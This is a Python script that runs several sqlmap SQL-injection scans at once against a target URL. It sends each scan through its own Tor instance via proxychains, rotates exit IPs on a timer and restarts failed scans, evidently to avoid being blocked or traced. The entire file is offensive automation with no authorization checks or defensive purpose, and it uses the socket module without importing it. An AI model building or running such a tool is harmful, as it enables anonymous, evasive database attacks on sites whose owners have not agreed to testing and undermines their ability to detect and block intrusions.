#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import argparse
import re
import signal
import threading
import random
from datetime import datetime

# Global variables to track processes and instances
running_processes = []
tor_instances = []

def run_command(command):
    """Run a shell command and return the output"""
    try:
        result = subprocess.run(command, shell=True, check=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {command}")
        print(f"Error message: {e.stderr}")
        return None

def setup_tor_instances(num_instances=5):
    """Setup Tor instances or use existing ones"""
    global tor_instances

    # Check if tor_proxy_setup.py exists
    if not os.path.exists('./tor_proxy_setup.py'):
        print("[!] tor_proxy_setup.py not found in the current directory.")
        sys.exit(1)

    print(f"[*] Setting up {num_instances} Tor instances...")

    # Run the tor_proxy_setup.py script to set up multiple instances
    result = run_command(f"sudo python3 ./tor_proxy_setup.py --multi-tor {num_instances}")

    # Check if setup was successful by looking for running instances
    print("[*] Verifying Tor instances...")
    tor_instances = []
    success_count = 0

    # Wait a few seconds for all instances to start
    time.sleep(5)

    for i in range(1, num_instances+1):
        socks_port = 9050 + i
        control_port = 9051 + i

        # Check if instance is running by trying to connect to its port
        is_running = False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect(("127.0.0.1", socks_port))
            sock.close()
            is_running = True
            success_count += 1
        except (socket.timeout, socket.error):
            print(f"[!] Warning: Tor instance {i} (port {socks_port}) appears to be not running")
            # Try restarting the instance
            run_command(f"sudo python3 ./tor_proxy_setup.py --restart-tor --instance {i}")
            time.sleep(3)
            # Check again
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect(("127.0.0.1", socks_port))
                sock.close()
                is_running = True
                success_count += 1
            except (socket.timeout, socket.error):
                print(f"[!] Error: Failed to start Tor instance {i}")

        if is_running:
            tor_instances.append({"instance": i, "socks_port": socks_port, "control_port": control_port})
            print(f"[+] Tor instance {i} (port {socks_port}) is running")

    print(f"[+] Successfully set up {success_count} out of {num_instances} Tor instances")
    return tor_instances

def rotate_tor_ip(instance):
    """Rotate IP for a specific Tor instance"""
    instance_num = instance["instance"]
    control_port = instance["control_port"]
    socks_port = instance["socks_port"]

    print(f"[*] Rotating IP for Tor instance {instance_num}...")
    old_ip = None

    # Try to get the current IP (for comparison later)
    try:
        cmd = f"proxychains4 -q -f /etc/proxychains4.conf.{socks_port} curl -s https://api.ipify.org"
        old_ip = run_command(cmd)
    except:
        pass

    # Rotate the IP
    result = run_command(f"sudo python3 ./tor_proxy_setup.py --rotate --instance {instance_num}")

    # Wait a bit for the rotation to take effect
    time.sleep(3)

    # Verify if the IP actually changed
    try:
        cmd = f"proxychains4 -q -f /etc/proxychains4.conf.{socks_port} curl -s https://api.ipify.org"
        new_ip = run_command(cmd)

        if old_ip and new_ip and old_ip == new_ip:
            print(f"[!] Warning: IP for instance {instance_num} did not change. Trying to restart the instance...")
            run_command(f"sudo python3 ./tor_proxy_setup.py --restart-tor --instance {instance_num}")
            time.sleep(5)  # Give it more time to restart

            # Check if we can get a new IP now
            new_ip = run_command(cmd)
            if new_ip:
                print(f"[+] New IP for instance {instance_num}: {new_ip}")
            else:
                print(f"[!] Error: Could not get IP for instance {instance_num} after restart")
        elif new_ip:
            print(f"[+] New IP for instance {instance_num}: {new_ip}")
        else:
            print(f"[!] Error: Could not get new IP for instance {instance_num}")
    except Exception as e:
        print(f"[!] Error verifying IP change for instance {instance_num}: {str(e)}")

def monitor_and_restart_sqlmap(cmd, instance, payload, target_url, interval, log_file):
    """Monitor sqlmap and restart if it dies"""
    global running_processes

    instance_num = instance["instance"]
    socks_port = instance["socks_port"]
    proxychains_conf = f"/etc/proxychains4.conf.{socks_port}"

    print(f"[*] Starting sqlmap on instance {instance_num} with port {socks_port}")
    consecutive_failures = 0
    max_consecutive_failures = 3

    while True:
        try:
            # Verify Tor connection before starting sqlmap
            check_tor_cmd = f"proxychains4 -q -f {proxychains_conf} curl -s https://api.ipify.org"
            tor_ip = run_command(check_tor_cmd)

            if not tor_ip or not re.match(r'^\d+\.\d+\.\d+\.\d+$', tor_ip):
                print(f"[!] Tor connection for instance {instance_num} is not working. Trying to restart...")
                with open(log_file, "a") as f:
                    f.write(f"[{datetime.now()}] Tor connection for instance {instance_num} not working. Restarting Tor...\n")

                # Restart the Tor instance
                run_command(f"sudo python3 ./tor_proxy_setup.py --restart-tor --instance {instance_num}")
                time.sleep(5)  # Wait for Tor to restart

                # Check again
                tor_ip = run_command(check_tor_cmd)
                if not tor_ip or not re.match(r'^\d+\.\d+\.\d+\.\d+$', tor_ip):
                    print(f"[!] Still cannot establish Tor connection for instance {instance_num}. Skipping for now.")
                    with open(log_file, "a") as f:
                        f.write(f"[{datetime.now()}] Failed to establish Tor connection for instance {instance_num}. Waiting before retry.\n")
                    consecutive_failures += 1
                    if consecutive_failures >= max_consecutive_failures:
                        print(f"[!] Too many consecutive failures for instance {instance_num}. Taking a longer break.")
                        with open(log_file, "a") as f:
                            f.write(f"[{datetime.now()}] Too many consecutive failures. Taking a longer break.\n")
                        time.sleep(60)  # Take a longer break
                        consecutive_failures = 0
                    else:
                        time.sleep(10)  # Short break before retry
                    continue

            # Reset failure counter if we got here
            consecutive_failures = 0

            # Construct the full command
            full_cmd = f"proxychains4 -f {proxychains_conf} {cmd}"

            # Log the command
            with open(log_file, "a") as f:
                f.write(f"\n[{datetime.now()}] Starting sqlmap on instance {instance_num} (IP: {tor_ip}):\n{full_cmd}\n")

            # Start the process
            print(f"[*] Running sqlmap on instance {instance_num} with IP: {tor_ip}")
            process = subprocess.Popen(full_cmd, shell=True)

            # Add to running processes
            running_processes.append({"process": process, "instance": instance_num, "cmd": full_cmd})

            # Wait for the process to complete or until interval
            start_time = time.time()
            while process.poll() is None:
                # Check if it's time to rotate IP
                if interval > 0 and time.time() - start_time >= interval:
                    print(f"[*] Rotating IP for instance {instance_num} after {interval} seconds")
                    rotate_tor_ip(instance)
                    start_time = time.time()

                time.sleep(1)

            # If process ended with non-zero exit code, it failed
            if process.returncode != 0:
                print(f"[!] sqlmap process on instance {instance_num} exited with code {process.returncode}. Restarting...")
                with open(log_file, "a") as f:
                    f.write(f"[{datetime.now()}] sqlmap on instance {instance_num} exited with code {process.returncode}. Restarting...\n")
            else:
                print(f"[+] sqlmap process on instance {instance_num} completed successfully")
                with open(log_file, "a") as f:
                    f.write(f"[{datetime.now()}] sqlmap on instance {instance_num} completed successfully\n")
                break

        except KeyboardInterrupt:
            print("\n[!] Keyboard interrupt detected. Exiting...")
            sys.exit(0)
        except Exception as e:
            print(f"[!] Error in sqlmap process on instance {instance_num}: {str(e)}. Restarting...")
            with open(log_file, "a") as f:
                f.write(f"[{datetime.now()}] Error in sqlmap on instance {instance_num}: {str(e)}. Restarting...\n")
            consecutive_failures += 1

        # Remove process from running_processes
        running_processes = [p for p in running_processes if p["process"] != process]

        # Wait before restarting
        if consecutive_failures >= max_consecutive_failures:
            print(f"[!] Too many consecutive failures for instance {instance_num}. Taking a longer break.")
            with open(log_file, "a") as f:
                f.write(f"[{datetime.now()}] Too many consecutive failures. Taking a longer break.\n")
            time.sleep(60)  # Take a longer break
            consecutive_failures = 0
        else:
            time.sleep(5)  # Normal restart delay

def signal_handler(sig, frame):
    """Handle Ctrl+C to cleanly exit"""
    print("\n[!] Stopping all running processes...")
    for proc_info in running_processes:
        proc = proc_info["process"]
        instance_num = proc_info["instance"]
        print(f"[*] Terminating sqlmap process on instance {instance_num}")
        try:
            proc.terminate()
            time.sleep(1)
            if proc.poll() is None:
                proc.kill()
        except:
            pass

    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="Multi-threaded SQLMap Runner with Tor Proxies")
    parser.add_argument("-i", "--instances", type=int, default=5, help="Number of Tor instances to use (default: 5)")
    parser.add_argument("-u", "--url", required=True, help="Target URL for sqlmap")
    parser.add_argument("-p", "--payload", help="Additional sqlmap parameters (e.g., '--dbs --level=5')")
    parser.add_argument("-r", "--rotate", type=int, default=60, help="IP rotation interval in seconds (0 to disable, default: 60)")
    parser.add_argument("-l", "--log", default="/tmp/multi_sqlmap.log", help="Log file path (default: /tmp/multi_sqlmap.log)")
    parser.add_argument("-v", "--verify", action="store_true", help="Verify Tor instances before starting")
    parser.add_argument("--retry", type=int, default=3, help="Number of retries for Tor instance setup (default: 3)")

    args = parser.parse_args()

    # Register signal handler for clean exit
    signal.signal(signal.SIGINT, signal_handler)

    # Print banner
    print("\n" + "=" * 60)
    print(" " * 15 + "Multi-threaded SQLMap Runner")
    print(" " * 10 + "with Tor Proxy IP Rotation")
    print("=" * 60)

    # Setup logging
    with open(args.log, "w") as f:
        f.write(f"[{datetime.now()}] Starting Multi-threaded SQLMap Runner\n")
        f.write(f"Target URL: {args.url}\n")
        f.write(f"Number of instances: {args.instances}\n")
        f.write(f"IP rotation interval: {args.rotate} seconds\n")

    print(f"[*] Target URL: {args.url}")
    print(f"[*] Number of Tor instances: {args.instances}")
    print(f"[*] IP rotation interval: {args.rotate} seconds")
    print(f"[*] Log file: {args.log}")

    # Check if tor_proxy_setup.py is executable
    if not os.access('./tor_proxy_setup.py', os.X_OK):
        print("[*] Making tor_proxy_setup.py executable...")
        run_command("chmod +x ./tor_proxy_setup.py")

    # Setup Tor instances with retry mechanism
    instances = []
    for attempt in range(args.retry):
        print(f"[*] Setting up Tor instances (attempt {attempt+1}/{args.retry})...")
        instances = setup_tor_instances(args.instances)

        if len(instances) >= 1:  # At least one instance is enough to continue
            break

        if attempt < args.retry - 1:  # If not the last attempt
            print(f"[!] Failed to set up enough Tor instances. Retrying in 10 seconds...")
            time.sleep(10)

    if not instances:
        print("[!] Error: Failed to set up any Tor instances after multiple attempts.")
        sys.exit(1)

    # If we have fewer instances than requested, update the user
    if len(instances) < args.instances:
        print(f"[!] Warning: Only {len(instances)} out of {args.instances} Tor instances are available.")

    # Verify Tor instances if requested
    if args.verify:
        print("[*] Verifying Tor instances...")
        working_instances = []

        for instance in instances:
            instance_num = instance["instance"]
            socks_port = instance["socks_port"]
            cmd = f"proxychains4 -q -f /etc/proxychains4.conf.{socks_port} curl -s https://api.ipify.org"
            ip = run_command(cmd)

            if ip and re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
                print(f"[+] Tor instance {instance_num} (port {socks_port}) is working. IP: {ip}")
                working_instances.append(instance)
            else:
                print(f"[!] Tor instance {instance_num} (port {socks_port}) is not working properly. Trying to restart...")
                run_command(f"sudo python3 ./tor_proxy_setup.py --restart-tor --instance {instance_num}")
                time.sleep(5)

                # Try again after restart
                ip = run_command(cmd)
                if ip and re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
                    print(f"[+] Tor instance {instance_num} is now working after restart. IP: {ip}")
                    working_instances.append(instance)
                else:
                    print(f"[!] Tor instance {instance_num} still not working. Skipping this instance.")

        instances = working_instances

        if not instances:
            print("[!] Error: No working Tor instances found after verification.")
            sys.exit(1)

    # Prepare sqlmap command
    base_cmd = f"sqlmap -u \"{args.url}\" --batch --random-agent"
    if args.payload:
        base_cmd += f" {args.payload}"

    print(f"\n[*] Starting SQLMap with command: {base_cmd}")
    print(f"[*] Using {len(instances)} Tor instances with IP rotation every {args.rotate} seconds")

    # Start a thread for each instance
    threads = []
    for instance in instances:
        thread = threading.Thread(
            target=monitor_and_restart_sqlmap,
            args=(base_cmd, instance, args.payload, args.url, args.rotate, args.log)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()
        time.sleep(3)  # Slightly longer delay between thread starts to avoid overwhelming Tor network

    # Keep the main thread alive and monitor thread status
    try:
        while True:
            # Count active threads
            active_threads = sum(1 for thread in threads if thread.is_alive())
            if active_threads == 0:
                print("\n[!] All sqlmap processes have completed or failed.")
                break

            # Print status periodically
            if random.randint(1, 30) == 1:  # Occasionally show status (roughly every 30 seconds)
                print(f"\n[*] Status: {active_threads} active sqlmap processes running")

                # List running processes
                for proc in running_processes:
                    instance_num = proc["instance"]
                    print(f"  - Instance {instance_num}: Running")

            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt detected. Cleaning up...")
        signal_handler(signal.SIGINT, None)
        sys.exit(0)

    print("\n[+] All operations completed.")

if __name__ == "__main__":
    # Check if script is run with root privileges
    if os.geteuid() != 0:
        print("[!] This script requires root privileges.")
        print("[!] Please run with sudo or as root.")
        sys.exit(1)

    main()
